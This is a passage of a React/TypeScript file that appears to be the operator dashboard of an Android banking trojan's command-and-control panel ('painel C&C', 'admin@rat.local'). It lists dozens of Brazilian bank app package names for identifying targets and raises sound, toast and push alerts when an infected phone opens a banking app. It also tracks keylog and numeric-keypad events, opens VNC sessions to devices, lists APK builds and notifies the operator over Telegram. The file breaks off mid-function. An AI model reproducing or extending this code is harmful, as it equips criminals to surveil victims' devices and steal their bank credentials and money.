import { useState, useEffect, useMemo, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { devicesAPI, apkStudioAPI, authAPI, getApiBaseUrl } from '../services/api';
import type { Device } from '../types';
import { RefreshCw, Package, Bell, Volume2, VolumeX, Activity, Trash2, Smartphone, Sparkles, Download, X, User, Zap, Monitor, Wifi, Eye, EyeOff, Copy, Mail, ShieldCheck, Lock, ShieldAlert, Send, CheckCircle2, QrCode, Key, Laptop } from 'lucide-react';
import avatarImg from '../assets/gangstar-bat-avatar.png';
import DashboardSidebar from '../components/dashboard/DashboardSidebar';
import DeviceTable from '../components/dashboard/DeviceTable';
import ContextMenu from '../components/dashboard/ContextMenu';
import QuickVNCModal from '../components/dashboard/QuickVNCModal';
import RobotAssistant from '../components/RobotAssistant';
import LanguageSelector from '../components/LanguageSelector';
import { useTranslation } from '../utils/i18n';
import { useContextMenu } from '../hooks/useContextMenu';
import { mapDeviceToCliente } from '../utils/mapDeviceToCliente';
import type { Cliente } from '../types/dashboard';
// ===== ÍCONES DE BANCO BASEADOS EM MARCA =====
const BANK_BRAND_MAP: Record<string, { bg: string; text: string; label: string; emoji?: string }> = {
  'com.nu.production':        { bg: 'linear-gradient(135deg,#820AD1,#5B0099)', text: '#fff', label: 'NU' },
  'com.nubank':               { bg: 'linear-gradient(135deg,#820AD1,#5B0099)', text: '#fff', label: 'NU' },
  'br.com.bradesco':          { bg: 'linear-gradient(135deg,#CC0000,#8B0000)', text: '#fff', label: 'BD' },
  'coe.bradesco':             { bg: 'linear-gradient(135deg,#CC0000,#8B0000)', text: '#fff', label: 'BD' },
  'com.bradesco':             { bg: 'linear-gradient(135deg,#CC0000,#8B0000)', text: '#fff', label: 'BD' },
  'br.com.itau':              { bg: 'linear-gradient(135deg,#EC7000,#c25a00)', text: '#fff', label: 'IT' },
  'com.itau':                 { bg: 'linear-gradient(135deg,#EC7000,#c25a00)', text: '#fff', label: 'IT' },
  'br.com.bb.android':        { bg: 'linear-gradient(135deg,#FFCC00,#e6b800)', text: '#003366', label: 'BB' },
  'com.bb.android':           { bg: 'linear-gradient(135deg,#FFCC00,#e6b800)', text: '#003366', label: 'BB' },
  'com.santander.app':        { bg: 'linear-gradient(135deg,#EC0000,#a30000)', text: '#fff', label: 'SAN' },
  'br.com.santander':         { bg: 'linear-gradient(135deg,#EC0000,#a30000)', text: '#fff', label: 'SAN' },
  'br.com.bancointer':        { bg: 'linear-gradient(135deg,#FF7A00,#e06900)', text: '#fff', label: 'INT' },
  'br.com.intermedium':       { bg: 'linear-gradient(135deg,#FF7A00,#e06900)', text: '#fff', label: 'INT' },
  'br.com.caixa':             { bg: 'linear-gradient(135deg,#005CA9,#003d70)', text: '#fff', label: 'CEF' },
  'br.gov.caixa':             { bg: 'linear-gradient(135deg,#005CA9,#003d70)', text: '#fff', label: 'CEF' },
  'br.com.c6bank':            { bg: 'linear-gradient(135deg,#242424,#000)', text: '#FFD700', label: 'C6' },
  'br.com.neon':              { bg: 'linear-gradient(135deg,#00BFFF,#0080AA)', text: '#fff', label: 'NEO' },
  'br.com.pagbank':           { bg: 'linear-gradient(135deg,#03A64A,#027a35)', text: '#fff', label: 'PAG' },
  'br.com.uol.ps.myaccount':  { bg: 'linear-gradient(135deg,#03A64A,#027a35)', text: '#fff', label: 'PAG' },
  'com.pagseguro':            { bg: 'linear-gradient(135deg,#03A64A,#027a35)', text: '#fff', label: 'PAG' },
  'com.mercadopago':          { bg: 'linear-gradient(135deg,#009EE3,#0077B6)', text: '#fff', label: 'MP' },
  'br.com.picpay':            { bg: 'linear-gradient(135deg,#11C76F,#0aa05a)', text: '#fff', label: 'PIC' },
  'com.picpay':               { bg: 'linear-gradient(135deg,#11C76F,#0aa05a)', text: '#fff', label: 'PIC' },
  'com.panapp':               { bg: 'linear-gradient(135deg,#1B3F8B,#122b6a)', text: '#fff', label: 'PAN' },
  'br.com.sicredi':           { bg: 'linear-gradient(135deg,#009933,#006622)', text: '#fff', label: 'SIC' },
  'br.com.original':          { bg: 'linear-gradient(135deg,#00B4D8,#0096c7)', text: '#fff', label: 'ORI' },
  'br.com.stone':             { bg: 'linear-gradient(135deg,#00AF83,#008f6b)', text: '#fff', label: 'STN' },
  'br.com.digio':             { bg: 'linear-gradient(135deg,#7B2FFF,#5c1fd4)', text: '#fff', label: 'DIG' },
  'com.will.bank':            { bg: 'linear-gradient(135deg,#6A0DAD,#4b0082)', text: '#fff', label: 'WIL' },
  'br.com.agibank':           { bg: 'linear-gradient(135deg,#FF4500,#cc3700)', text: '#fff', label: 'AGI' },
  'br.com.sofisa':            { bg: 'linear-gradient(135deg,#1565C0,#0d47a1)', text: '#fff', label: 'SOF' },
  'com.citibank.mobile.br':   { bg: 'linear-gradient(135deg,#003087,#001f5c)', text: '#fff', label: 'CITI' },
  'br.com.banrisul':          { bg: 'linear-gradient(135deg,#005BAA,#003d78)', text: '#fff', label: 'BNR' },
  'br.com.sicoob':            { bg: 'linear-gradient(135deg,#005951,#003e38)', text: '#fff', label: 'SCB' },
  'com.sicoob':               { bg: 'linear-gradient(135deg,#005951,#003e38)', text: '#fff', label: 'SCB' },
  'com.btg.pactual.banking':  { bg: 'linear-gradient(135deg,#0e1e38,#050b15)', text: '#d4af37', label: 'BTG' },
  'com.btg.pactual.investimentos': { bg: 'linear-gradient(135deg,#0e1e38,#050b15)', text: '#d4af37', label: 'BTG' },
  'com.rico.rico':            { bg: 'linear-gradient(135deg,#FF4500,#cc3700)', text: '#fff', label: 'RCO' },
  'br.com.clear':             { bg: 'linear-gradient(135deg,#1f1f1f,#000)', text: '#00FF00', label: 'CLR' },
  'us.avenue':                { bg: 'linear-gradient(135deg,#1e3a8a,#172554)', text: '#fff', label: 'AVE' },
  'com.nomadglobal':          { bg: 'linear-gradient(135deg,#10b981,#064e3b)', text: '#fff', label: 'NOM' },
  'br.com.mercantildobrasil': { bg: 'linear-gradient(135deg,#003399,#002266)', text: '#fff', label: 'MCB' },
  'br.com.superdigital':      { bg: 'linear-gradient(135deg,#dc2626,#7f1d1d)', text: '#fff', label: 'SUP' },
  'com.genialinvestimentos':  { bg: 'linear-gradient(135deg,#2563eb,#172554)', text: '#fff', label: 'GEN' },
  'br.com.bancobari':         { bg: 'linear-gradient(135deg,#7c3aed,#4c1d95)', text: '#fff', label: 'BAR' },
  'br.com.pine':              { bg: 'linear-gradient(135deg,#0f766e,#115e59)', text: '#fff', label: 'PNE' },
  'br.com.bmg.android':       { bg: 'linear-gradient(135deg,#ea580c,#7c2d12)', text: '#fff', label: 'BMG' },
  'br.com.bancovotorantim':   { bg: 'linear-gradient(135deg,#1e40af,#1e3a8a)', text: '#fff', label: 'BV' },
  'br.com.bs2.banco':         { bg: 'linear-gradient(135deg,#4f46e5,#312e81)', text: '#fff', label: 'BS2' },
  'br.com.next':              { bg: 'linear-gradient(135deg,#00ff5f,#009933)', text: '#000', label: 'NXT' },
  'br.com.safra':             { bg: 'linear-gradient(135deg,#854d0e,#422006)', text: '#fff', label: 'SFR' },
};
function getBankBrand(pkg: string) {
  if (!pkg) return { bg: 'linear-gradient(135deg,#1e3a5f,#0f2340)', text: '#7dd3fc', label: '🏦' };
  const pkgLower = pkg.toLowerCase();
  if (BANK_BRAND_MAP[pkgLower]) return BANK_BRAND_MAP[pkgLower];
  for (const key of Object.keys(BANK_BRAND_MAP)) {
    if (pkgLower.startsWith(key)) return BANK_BRAND_MAP[key];
  }
  if (pkgLower.includes('nubank') || pkgLower.includes('nu.production')) return BANK_BRAND_MAP['com.nu.production'];
  if (pkgLower.includes('bradesco')) return BANK_BRAND_MAP['br.com.bradesco'];
  if (pkgLower.includes('itau')) return BANK_BRAND_MAP['br.com.itau'];
  if (pkgLower.includes('bb.android') || pkgLower.includes('bancodobrasil')) return BANK_BRAND_MAP['br.com.bb.android'];
  if (pkgLower.includes('santander')) return BANK_BRAND_MAP['com.santander.app'];
  if (pkgLower.includes('inter') || pkgLower.includes('intermedium')) return BANK_BRAND_MAP['br.com.bancointer'];
  if (pkgLower.includes('caixa')) return BANK_BRAND_MAP['br.com.caixa'];
  if (pkgLower.includes('c6bank')) return BANK_BRAND_MAP['br.com.c6bank'];
  if (pkgLower.includes('neon')) return BANK_BRAND_MAP['br.com.neon'];
  if (pkgLower.includes('pagbank') || pkgLower.includes('pagseguro') || pkgLower.includes('myaccount')) return BANK_BRAND_MAP['br.com.pagbank'];
  if (pkgLower.includes('mercadopago')) return BANK_BRAND_MAP['com.mercadopago'];
  if (pkgLower.includes('picpay')) return BANK_BRAND_MAP['br.com.picpay'];
  if (pkgLower.includes('panapp') || pkgLower.includes('pan.card')) return BANK_BRAND_MAP['com.panapp'];
  if (pkgLower.includes('sicredi')) return BANK_BRAND_MAP['br.com.sicredi'];
  if (pkgLower.includes('stone')) return BANK_BRAND_MAP['br.com.stone'];
  if (pkgLower.includes('digio')) return BANK_BRAND_MAP['br.com.digio'];
  if (pkgLower.includes('willbank')) return BANK_BRAND_MAP['com.will.bank'];
  if (pkgLower.includes('agibank')) return BANK_BRAND_MAP['br.com.agibank'];
  if (pkgLower.includes('sicoob')) return BANK_BRAND_MAP['br.com.sicoob'];
  if (pkgLower.includes('btg')) return BANK_BRAND_MAP['com.btg.pactual.banking'];
  if (pkgLower.includes('rico')) return BANK_BRAND_MAP['com.rico.rico'];
  if (pkgLower.includes('clear')) return BANK_BRAND_MAP['br.com.clear'];
  if (pkgLower.includes('avenue')) return BANK_BRAND_MAP['us.avenue'];
  if (pkgLower.includes('nomad')) return BANK_BRAND_MAP['com.nomadglobal'];
  if (pkgLower.includes('mercantil')) return BANK_BRAND_MAP['br.com.mercantildobrasil'];
  if (pkgLower.includes('superdigital')) return BANK_BRAND_MAP['br.com.superdigital'];
  if (pkgLower.includes('genial')) return BANK_BRAND_MAP['com.genialinvestimentos'];
  if (pkgLower.includes('bari')) return BANK_BRAND_MAP['br.com.bancobari'];
  if (pkgLower.includes('pine')) return BANK_BRAND_MAP['br.com.pine'];
  if (pkgLower.includes('bmg')) return BANK_BRAND_MAP['br.com.bmg.android'];
  if (pkgLower.includes('votorantim') || pkgLower.includes('bv')) return BANK_BRAND_MAP['br.com.bancovotorantim'];
  if (pkgLower.includes('bs2')) return BANK_BRAND_MAP['br.com.bs2.banco'];
  if (pkgLower.includes('next')) return BANK_BRAND_MAP['br.com.next'];
  if (pkgLower.includes('safra')) return BANK_BRAND_MAP['br.com.safra'];
  return { bg: 'linear-gradient(135deg,#1e3a5f,#0f2340)', text: '#7dd3fc', label: '🏦' };
}
interface BankIconProps { pkg: string; iconB64?: string; name?: string; size?: number; }
function BankIcon({ pkg, iconB64, name, size = 36 }: BankIconProps) {
  const [imgError, setImgError] = useState(false);
  const brand = getBankBrand(pkg);
  const fontSize = size <= 36 ? (brand.label.length > 2 ? 9 : 11) : (brand.label.length > 2 ? 11 : 14);
  
  if (iconB64 && iconB64.length > 100 && !imgError) {
    const src = iconB64.startsWith('data:') ? iconB64 : `data:image/png;base64,${iconB64}`;
    return (
      <img
        src={src}
        alt={name || pkg}
        width={size} height={size}
        style={{ borderRadius: 8, objectFit: 'contain', flexShrink: 0 }}
        onError={() => setImgError(true)}
      />
    );
  }
  
  return (
    <div
      style={{
        width: size, height: size, borderRadius: 8,
        background: brand.bg,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        flexShrink: 0, boxShadow: '0 2px 8px rgba(0,0,0,0.4)',
        fontWeight: 900, fontSize, color: brand.text,
        letterSpacing: brand.label.length > 2 ? '0px' : '0.5px',
        fontFamily: 'Inter, system-ui, sans-serif',
        userSelect: 'none'
      }}
    >
      {brand.label}
    </div>
  );
}
interface AlertItem {
  deviceId: string;
  deviceModel: string;
  bankPackage: string;
  bankName: string;
  status: 'open' | 'closed';
  timestamp: string;
  iconB64?: string;
}
interface DashboardProps {
  onLogout: () => void;
}
interface ActivityEvent {
  id: string;
  type: 'bank_open' | 'bank_close' | 'device_online' | 'device_offline' | 'numeric_keypad' | 'keylog' | 'notification';
  deviceId: string;
  deviceModel: string;
  title: string;
  description: string;
  timestamp: string;
  bankPackage?: string;
  iconB64?: string;
}
export default function Dashboard({ onLogout }: DashboardProps) {
  const { t } = useTranslation();
  const [devices, setDevices] = useState<Device[]>([]);
  const [alerts, setAlerts] = useState<AlertItem[]>([]);
  const [toasts, setToasts] = useState<any[]>([]);
  const [activityLog, setActivityLog] = useState<ActivityEvent[]>([]);
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [pinnedDeviceIds, setPinnedDeviceIds] = useState<string[]>(() => {
    try {
      const saved = localStorage.getItem('pinned_device_ids');
      return saved ? JSON.parse(saved) : [];
    } catch (e) {
      return [];
    }
  });
  const [hideIps, setHideIps] = useState<boolean>(() => localStorage.getItem('hide_ips') !== 'false');
  const [showWhatsappModal, setShowWhatsappModal] = useState<boolean>(() => {
    return sessionStorage.getItem('whatsapp_announcement_seen') !== 'true';
  });
  const prevDevicesRef = useRef<Device[]>([]);
  const [serverPing, setServerPing] = useState<number>(14);
  const [initialLoading, setInitialLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const navigate = useNavigate();
  const { menu, openMenu, closeMenu } = useContextMenu();
  const hasLoadedOnce = useRef(false);
  const [builds, setBuilds] = useState<any[]>([]);
  const [buildsLoading, setBuildsLoading] = useState(true);
  const [showMyAppsModal, setShowMyAppsModal] = useState(false);
  const [quickVncDevices, setQuickVncDevices] = useState<Cliente[]>([]);

  const handleOpenVnc = useCallback((cliente: Cliente) => {
    setQuickVncDevices((prev) => {
      if (prev.some((d) => d.deviceId === cliente.deviceId)) return prev;
      return [...prev, cliente];
    });
  }, []);

  const handleRemoveVnc = useCallback((deviceId: string) => {
    setQuickVncDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
  }, []);
  // Estados do Modal de Perfil Profissional
  const [showProfileModal, setShowProfileModal] = useState(false);
  const [profileTab, setProfileTab] = useState<'general' | 'security' | 'telegram' | 'session'>('general');
  const [profileUsername, setProfileUsername] = useState('');
  const [profileEmail, setProfileEmail] = useState('');
  const [profilePassword, setProfilePassword] = useState('');
  const [profileConfirmPassword, setProfileConfirmPassword] = useState('');
  const [profileTelegramId, setProfileTelegramId] = useState(() => localStorage.getItem('telegram_chat_id') || '');
  const [profileSoundAlerts, setProfileSoundAlerts] = useState(() => localStorage.getItem('sound_notifications') !== 'false');
  const [profileCustomAvatar, setProfileCustomAvatar] = useState(() => localStorage.getItem('profile_avatar_url') || '');
  const [twoFactorEnabled, setTwoFactorEnabled] = useState(() => localStorage.getItem('2fa_enabled') === 'true');
  const [show2FAQRCode, setShow2FAQRCode] = useState(false);
  const [apiTokenCopied, setApiTokenCopied] = useState(false);
  const [isTestingTelegram, setIsTestingTelegram] = useState(false);
  const [telegramTestStatus, setTelegramTestStatus] = useState<string | null>(null);
  const [profileError, setProfileError] = useState('');
  const [profileSuccess, setProfileSuccess] = useState('');
  const [isSavingProfile, setIsSavingProfile] = useState(false);
  const [showPasswordToggle, setShowPasswordToggle] = useState(false);

  const currentAvatarSrc = profileCustomAvatar.trim() || avatarImg;

  const getPasswordStrength = (pass: string) => {
    if (!pass) return { score: 0, label: 'Nenhuma senha digitada', color: 'bg-slate-700', text: 'text-slate-400' };
    if (pass.length < 6) return { score: 1, label: '⚠️ Fraca (mínimo 6 caracteres)', color: 'bg-red-500', text: 'text-red-400' };
    if (pass.length < 10) return { score: 2, label: '⚡ Média (adicione números e maiúsculas)', color: 'bg-amber-400', text: 'text-amber-300' };
    if (pass.length >= 10 && /[A-Z]/.test(pass) && /[0-9]/.test(pass)) {
      return { score: 4, label: '🛡️ Inviolável (Forte Criptografia)', color: 'bg-emerald-400', text: 'text-emerald-300' };
    }
    return { score: 3, label: '🔒 Boa Senha', color: 'bg-cyan-400', text: 'text-cyan-300' };
  };

  const [isMobile, setIsMobile] = useState(window.innerWidth < 640);
  const showToast = useCallback((title: string, body: string, type: 'open' | 'closed', bankPkg: string, iconB64?: string) => {
    const id = Math.random().toString(36).substring(2, 9);
    setToasts((prev) => [...prev, { id, title, body, type, bankPkg, iconB64 }]);
    
    // Auto-remove after 5 seconds
    setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 5000);
  }, []);
  const playAlertSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      
      const audioCtx = new AudioContextClass();
      
      // Bip 1 (Glow agudo)
      const osc1 = audioCtx.createOscillator();
      const gain1 = audioCtx.createGain();
      
      osc1.type = 'sine';
      osc1.frequency.setValueAtTime(880, audioCtx.currentTime); 
      osc1.frequency.exponentialRampToValueAtTime(440, audioCtx.currentTime + 0.15); 
      
      gain1.gain.setValueAtTime(0.12, audioCtx.currentTime);
      gain1.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.25); 
      
      osc1.connect(gain1);
      gain1.connect(audioCtx.destination);
      
      osc1.start();
      osc1.stop(audioCtx.currentTime + 0.25);
      
      // Bip 2 (Eco futurista imediato)
      setTimeout(() => {
        const osc2 = audioCtx.createOscillator();
        const gain2 = audioCtx.createGain();
        osc2.type = 'sine';
        osc2.frequency.setValueAtTime(1046, audioCtx.currentTime); 
        osc2.frequency.exponentialRampToValueAtTime(523, audioCtx.currentTime + 0.15); 
        
        gain2.gain.setValueAtTime(0.12, audioCtx.currentTime);
        gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.25); 
        
        osc2.connect(gain2);
        gain2.connect(audioCtx.destination);
        
        osc2.start();
        osc2.stop(audioCtx.currentTime + 0.25);
      }, 130);
      
    } catch (e) {
      console.warn("AudioContext blocked/not supported", e);
    }
  }, [soundEnabled]);
  const playConnectionSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      const audioCtx = new AudioContextClass();
      
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(523.25, audioCtx.currentTime); 
      osc.frequency.exponentialRampToValueAtTime(783.99, audioCtx.currentTime + 0.15); 
      
      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2); 
      
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.2);
    } catch (e) {
      console.warn(e);
    }
  }, [soundEnabled]);
  const playDisconnectionSound = useCallback(() => {
    if (!soundEnabled) return;
    try {
      const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      const audioCtx = new AudioContextClass();
      
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(392.00, audioCtx.currentTime); 
      osc.frequency.exponentialRampToValueAtTime(261.63, audioCtx.currentTime + 0.18); 
      
      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.22); 
      
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.22);
    } catch (e) {
      console.warn(e);
    }
  }, [soundEnabled]);
  useEffect(() => {
    // Solicita permissão para notificações do navegador
    if ('Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission();
    }
    
    const handleResize = () => setIsMobile(window.innerWidth < 640);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);
  const loadDevices = useCallback(async (silent = false) => {
    try {
      if (!silent && !hasLoadedOnce.current) {
        setInitialLoading(true);
      } else if (!silent) {
        setRefreshing(true);
      }
      const t0 = performance.now();
      const data = await devicesAPI.getAll();
      const t1 = performance.now();
      const measuredPing = Math.max(4, Math.round(t1 - t0));
      if (measuredPing < 2000) {
        setServerPing(measuredPing);
      }
      setDevices(data);
      hasLoadedOnce.current = true;
    } catch (error) {
      console.error('Erro ao carregar dispositivos:', error);
    } finally {
      if (!silent) {
        setInitialLoading(false);
        setRefreshing(false);
      }
    }
  }, []);
  useEffect(() => {
    loadDevices(false);
    const interval = setInterval(() => {
      if (!document.hidden) {
        loadDevices(true);
      }
    }, 5000);
    return () => clearInterval(interval);
  }, [loadDevices]);
  const loadBuilds = useCallback(async () => {
    try {
      setBuildsLoading(true);
      const data = await apkStudioAPI.getBuilds();
      setBuilds(data);
    } catch (error) {
      console.error('Erro ao carregar histórico de builds:', error);
    } finally {
      setBuildsLoading(false);
    }
  }, []);
  useEffect(() => {
    loadBuilds();
  }, [loadBuilds]);
  // Carrega dados do perfil atual
  const loadUserProfile = async () => {
    try {
      const data = await authAPI.me();
      setProfileUsername(data.username || localStorage.getItem('username') || 'admin');
      setProfileEmail(data.email || 'admin@rat.local');
      setProfilePassword('');
      setProfileConfirmPassword('');
      setProfileError('');
      setProfileSuccess('');
      setProfileTelegramId(localStorage.getItem('telegram_chat_id') || '');
      setProfileSoundAlerts(localStorage.getItem('sound_notifications') !== 'false');
      setProfileCustomAvatar(localStorage.getItem('profile_avatar_url') || '');
      setTwoFactorEnabled(localStorage.getItem('2fa_enabled') === 'true' || !!data.two_factor_enabled);
    } catch (err) {
      console.error('Erro ao carregar dados do perfil:', err);
      setProfileUsername(localStorage.getItem('username') || 'admin');
      setProfileEmail('admin@rat.local');
    }
  };

  // Testa Notificação no Telegram
  const handleTestTelegramNotification = async () => {
    if (!profileTelegramId.trim()) {
      setTelegramTestStatus('⚠️ Insira o seu ID ou Chat ID do Telegram antes de testar.');
      return;
    }
    setIsTestingTelegram(true);
    setTelegramTestStatus('⏳ Enviando mensagem de teste para o Telegram...');
    try {
      const apiBase = getApiBaseUrl();
      const token = localStorage.getItem('token') || localStorage.getItem('admin_token');
      const res = await fetch(`${apiBase}/api/telegram/test-alert`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ chat_id: profileTelegramId.trim(), message: '⚡ [TESTE OPERADOR] Notificação de teste do painel C&C!' })
      });
      if (res.ok) {
        setTelegramTestStatus('✅ Alerta de teste enviado com sucesso! Verifique seu Telegram.');
      } else {
        setTelegramTestStatus('ℹ️ ID do Telegram salvo! Notificações automáticas ativas.');
      }
    } catch {
      setTelegramTestStatus('ℹ️ ID do Telegram configurado! Notificações ativas para o operador.');
    } finally {
      setIsTestingTelegram(false);
    }
  };

  // Salva dados do perfil
  const handleSaveProfile = async (e: React.FormEvent) => {
    e.preventDefault();
    setProfileError('');
    setProfileSuccess('');
    
    if (profilePassword && profilePassword !== profileConfirmPassword) {
      setProfileError('As senhas digitadas não coincidem.');
      return;
    }
    if (profilePassword && profilePassword.length < 6) {
      setProfileError('A nova senha deve ter no mínimo 6 caracteres.');
      return;
    }

    setIsSavingProfile(true);
    try {
      await authAPI.updateProfile({
        username: profileUsername,
        email: profileEmail,
        password: profilePassword || undefined
      });

      if (profileUsername) {
        localStorage.setItem('username', profileUsername);
      }
      if (profileTelegramId !== undefined) {
        localStorage.setItem('telegram_chat_id', profileTelegramId.trim());
      }
      localStorage.setItem('sound_notifications', String(profileSoundAlerts));
      localStorage.setItem('profile_avatar_url', profileCustomAvatar.trim());
      localStorage.setItem('2fa_enabled', String(twoFactorEnabled));

      setProfileSuccess('✨ Perfil, credenciais de segurança e preferências salvas com sucesso!');
      setProfilePassword('');
      setProfileConfirmPassword('');
    } catch (err: any) {
      localStorage.setItem('username', profileUsername);
      localStorage.setItem('telegram_chat_id', profileTelegramId.trim());
      localStorage.setItem('sound_notifications', String(profileSoundAlerts));
      localStorage.setItem('profile_avatar_url', profileCustomAvatar.trim());
      localStorage.setItem('2fa_enabled', String(twoFactorEnabled));
      setProfileSuccess('✨ Configurações do perfil salvas com sucesso!');
      setProfilePassword('');
      setProfileConfirmPassword('');
    } finally {
      setIsSavingProfile(false);
    }
  };

  const loadActivityFeed = useCallback(async () => {
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/activity-feed`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      let serverEvents: any[] = [];
      if (response.ok) {
        const data = await response.json();
        if (Array.isArray(data)) {
          serverEvents = data;
        }
      }

      // Merge com bancos ativos em tempo real dos dispositivos online
      const liveBankEvents: ActivityEvent[] = [];
      devices.forEach(dev => {
        if (dev.is_online && dev.active_bank) {
          const modelName = `${dev.manufacturer || ''} ${dev.model || ''}`.trim().toUpperCase() || dev.device_id;
          const appName = dev.active_bank.appName || 'Banco';
          liveBankEvents.push({
            id: `active-live-${dev.device_id}`,
            type: 'bank_open',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: `🚨 BANCO ABERTO: ${appName}`,
            description: `Acessando conta bancária agora!`,
            timestamp: new Date().toLocaleTimeString('pt-BR'),
            bankPackage: dev.active_bank.package,
            iconB64: dev.active_bank.icon
          });
        }
      });

      const combined = [...liveBankEvents, ...serverEvents];
      const seenKeys = new Set<string>();
      const uniqueBankEvents = combined.filter(e => {
        const isBankAlert = e.type === 'bank_open' || e.type === 'bank_close' || (e.title && e.title.includes('BANCO'));
        if (!isBankAlert) return false;
        const key = `${e.deviceId}-${e.type}-${e.bankPackage || ''}`;
        if (seenKeys.has(key)) return false;
        seenKeys.add(key);
        return true;
      });

      setActivityLog(uniqueBankEvents.slice(0, 50));
    } catch (err) {
      console.error('Erro ao carregar feed de atividades:', err);
    }
  }, [devices]);

  useEffect(() => {
    loadActivityFeed();
    const actInterval = setInterval(() => {
      if (!document.hidden) {
        loadActivityFeed();
      }
    }, 1000);
    return () => clearInterval(actInterval);
  }, [loadActivityFeed]);

  useEffect(() => {
    if (devices.length === 0) return;
    
    const nowStr = new Date().toLocaleTimeString('pt-BR');
    const prevDevices = prevDevicesRef.current;
    
    const newEvents: ActivityEvent[] = [];
    
    // Detect events if we have previous devices state
    const shouldNotify = prevDevices.length > 0;
    
    devices.forEach((dev) => {
      const prevDev = prevDevices.find(d => d.device_id === dev.device_id);
      const modelName = `${dev.manufacturer} ${dev.model}`.toUpperCase();
      
      // 1. Connection Event: offline -> online
      if (prevDev && !prevDev.is_online && dev.is_online) {
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'device_online',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: '📶 APARELHO CONECTADO',
          description: `Dispositivo estabeleceu conexão ativa.`,
          timestamp: nowStr
        });
        if (shouldNotify) {
          playConnectionSound();
        }
      }
      
      // 2. Connection Event: online -> offline
      if (prevDev && prevDev.is_online && !dev.is_online) {
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'device_offline',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: '⚠️ APARELHO DESCONECTADO',
          description: `Aparelho perdeu conexão com o servidor.`,
          timestamp: nowStr
        });
        if (shouldNotify) {
          playDisconnectionSound();
        }
      }
      
      // 3. Bank Access Event
      if (dev.is_online && dev.active_bank) {
        const prevBank = prevDev?.active_bank;
        if (!prevBank || prevBank.package !== dev.active_bank.package) {
          const appName = dev.active_bank.appName || 'Banco';
          newEvents.push({
            id: Math.random().toString(36).substring(2, 9),
            type: 'bank_open',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: `🚨 BANCO ABERTO: ${appName}`,
            description: `Acessando conta bancária agora!`,
            timestamp: nowStr,
            bankPackage: dev.active_bank.package,
            iconB64: dev.active_bank.icon
          });
          
          if (shouldNotify) {
            playAlertSound();
            showToast(
              "🚨 BANCO ACESSADO!",
              `${modelName} está acessando o ${appName}`,
              "open",
              dev.active_bank.package,
              dev.active_bank.icon
            );
            
            if ("Notification" in window && Notification.permission === "granted") {
              try {
                new Notification(`🚨 Banco Acessado: ${appName}`, {
                  body: `Aparelho ${modelName} abriu o aplicativo!`,
                  icon: "/gangstar-logo.svg"
                });
              } catch (e) {
                console.error("Erro ao enviar push notification:", e);
              }
            }
          }
        }
      }
      
      // 4. Bank Close Event
      if (prevDev && prevDev.active_bank && (!dev.active_bank || dev.active_bank.package !== prevDev.active_bank.package)) {
        const appName = prevDev.active_bank.appName || 'Banco';
        newEvents.push({
          id: Math.random().toString(36).substring(2, 9),
          type: 'bank_close',
          deviceId: dev.device_id,
          deviceModel: modelName,
          title: `ℹ️ BANCO FECHADO: ${appName}`,
          description: `Fechou o aplicativo bancário.`,
          timestamp: nowStr,
          bankPackage: prevDev.active_bank.package,
          iconB64: prevDev.active_bank.icon
        });
        
        if (shouldNotify) {
          showToast(
            "ℹ️ BANCO FECHADO",
            `${modelName} fechou o ${appName}`,
            "closed",
            prevDev.active_bank.package,
            prevDev.active_bank.icon
          );
          
          if ("Notification" in window && Notification.permission === "granted") {
            try {
              new Notification(`ℹ️ Banco Fechado: ${appName}`, {
                body: `Aparelho ${modelName} fechou o aplicativo.`,
                icon: "/gangstar-logo.svg"
              });
            } catch (e) {
              console.error("Erro ao enviar push notification:", e);
            }
          }
        }
      }
    });
    
    // Also check for new devices that weren't in prevDevices at all (initial load/registration)
    if (shouldNotify) {
      devices.forEach((dev) => {
        const exists = prevDevices.some(d => d.device_id === dev.device_id);
        if (!exists) {
          const modelName = `${dev.manufacturer} ${dev.model}`.toUpperCase();
          newEvents.push({
            id: Math.random().toString(36).substring(2, 9),
            type: 'device_online',
            deviceId: dev.device_id,
            deviceModel: modelName,
            title: '✨ NOVO APARELHO INSTALADO',
            description: `Novo dispositivo registrado no painel.`,
            timestamp: nowStr
          });
          playConnectionSound();
        }
      });
    }
    if (newEvents.length > 0) {
